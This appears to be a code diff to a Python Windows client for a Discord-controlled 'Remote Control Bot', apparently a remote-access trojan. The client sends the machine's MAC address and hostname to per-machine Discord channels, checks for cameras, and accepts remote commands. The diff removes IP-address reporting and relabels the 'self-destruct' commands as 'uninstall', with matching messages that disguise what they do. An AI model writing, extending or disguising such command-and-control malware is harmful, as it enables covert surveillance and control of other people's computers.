@@ -31,7 +31,7 @@ from PIL import Image
 from typing import Optional
 import win32com.client
 from pathlib import Path
-import pyngrok
+import socket as st1
 
 
 user_profile = os.environ['USERPROFILE']
@@ -97,24 +97,6 @@ def check_connected_cameras():
 
     return connected_cameras
 
-
-
-def get_ipv6_address():
-    hostname = socket.gethostname()
-    
-    addr_info = socket.getaddrinfo(hostname, None, socket.AF_INET6)
-    
-    for addr in addr_info:
-        ipv6_address = addr[4][0]
-        return ipv6_address
-    
-def get_device_ip4():
-    hostname = socket.gethostname()
-    ip_address = socket.gethostbyname(hostname)
-    return ip_address
-
-
-
 def get_device_ip():
     mac = hex(uuid.getnode()).replace('0x', '').upper()
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
@@ -153,9 +135,6 @@ async def on_ready():
             await guild.create_text_channel("events", category=category)
             await guild.create_text_channel("commands", category=category)
 
-            ipv6 = get_ipv6_address()
-            ipv4 = get_device_ip4()
-
             cameras = check_connected_cameras()
             if cameras:
                 cameras = "At least one camera found."
@@ -163,10 +142,7 @@ async def on_ready():
                 cameras = "No cameras found."
 
             des = f"""Mac address: {ip}
-            Ipv6: {ipv6}
-            Ipv4: {ipv4}
-
-            Cameras: {cameras}
+            Name: {st1.gethostname()}
 
             Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}
 
@@ -179,10 +155,7 @@ async def on_ready():
             channel = nextcord.utils.get(category.text_channels, name="info")
 
             des = f"""Mac address: {ip}
-            Ipv6: {ipv6}
-            Ipv4: {ipv4}
-
-            Cameras: {cameras}"""
+            Name: {st1.gethostname()}"""
 
             embed = nextcord.Embed(title="Client info:", timestamp=datetime.now(), colour=0xe4f500, description=des)
             embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
@@ -310,13 +283,13 @@ async def status(interaction : Interaction):
         await interaction.send(embed=embed, file=file)
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
-async def self_destruct(interaction : Interaction):
+async def uninstall(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
         
         user_id = interaction.user.id
-        await interaction.response.send_message("Self-destructing client...")
-        await interaction.edit_original_message(content="Client most likely self destructed!")
+        await interaction.response.send_message("Uninstalling this program all clients...")
+        await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
         script_content = """
 import shutil
 import os
@@ -371,10 +344,10 @@ sys.exit()
         sys.exit(0)
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
-async def self_destruct_all(interaction : Interaction):
+async def uninstall_all(interaction : Interaction):
     user_id = interaction.user.id
-    await interaction.response.send_message("Self-destructing all clients...")
-    await interaction.edit_original_message(content="Clients most likely self destructed!")
+    await interaction.response.send_message("Uninstalling this program all clients...")
+    await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
     script_content = """
 import shutil
 import os
